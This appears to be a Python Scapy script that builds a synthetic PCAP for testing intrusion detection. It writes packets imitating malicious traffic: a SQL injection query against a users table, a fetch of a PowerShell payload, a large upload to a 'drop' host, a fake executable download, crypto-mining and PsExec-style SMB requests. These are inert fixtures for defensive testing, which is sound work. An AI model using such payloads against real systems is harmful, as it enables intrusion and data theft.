"""ساخت یک PCAP آزمایشی بی‌خطر (فقط الگوها؛ هیچ بدافزار واقعی نیست) برای تست خودکار."""
import sys
from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw, wrpcap


def build(path):
    pk, t = [], 1_700_000_000.0
    c, srv, ext = "10.0.0.5", "10.0.0.9", "45.33.32.156"

    def add(p):
        nonlocal t
        t += 0.01
        p.time = t
        pk.append(p)

    mac = Ether()
    for q in ("abc.ngrok.io", "dns.google", "evil.top"):
        add(mac / IP(src=c, dst="8.8.8.8") / UDP(sport=40000, dport=53) / DNS(rd=1, qd=DNSQR(qname=q)))

    def http(req, seq=1):
        add(mac / IP(src=c, dst=ext) / TCP(sport=50000 + seq, dport=80, flags="PA", seq=seq) / Raw(req))
    http(b"GET /payload/run.ps1 HTTP/1.1\r\nHost: files.example.test\r\nUser-Agent: curl/8\r\n\r\n", 1)
    http(b"GET /item.php?id=1%27%20UNION%20SELECT%20user,pass%20FROM%20users-- HTTP/1.1\r\nHost: shop.example.test\r\n\r\n", 2)
    http(b"POST /up HTTP/1.1\r\nHost: drop.example.test\r\nContent-Length: 5000000\r\n\r\nAAAA", 3)
    hdr = bytearray(b"MZ" + b"\x00" * 0x7e)
    hdr[0x3c:0x40] = (0x80).to_bytes(4, "little")
    pe = bytes(hdr) + b"PE\x00\x00" + bytes(range(256)) * 8
    resp = b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n" % len(pe) + pe
    add(mac / IP(src=ext, dst=c) / TCP(sport=80, dport=50001, flags="PA", seq=1000) / Raw(resp))
    add(mac / IP(src=c, dst=ext) / TCP(sport=51000, dport=3333, flags="PA", seq=1) / Raw(b'{"id":1,"method":"mining.subscribe","params":[]}\n'))
    add(mac / IP(src=c, dst=srv) / TCP(sport=52000, dport=445, flags="PA", seq=1) / Raw(b"\xffSMB....\\pipe\\svcctl PSEXESVC"))
    for i in range(3):
        add(mac / IP(src=srv, dst=c) / UDP(sport=5355, dport=50000 + i) / Raw(b"\x12\x34\x80\x00\x00\x01\x00\x01\x00\x00\x00\x00" + bytes([5 + i]) + b"host" + bytes([i]) + b"\x00"))
    add(mac / IP(src=c, dst="198.51.100.77") / TCP(sport=53000, dport=8081, flags="S"))
    wrpcap(path, pk)


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "sample.pcap")
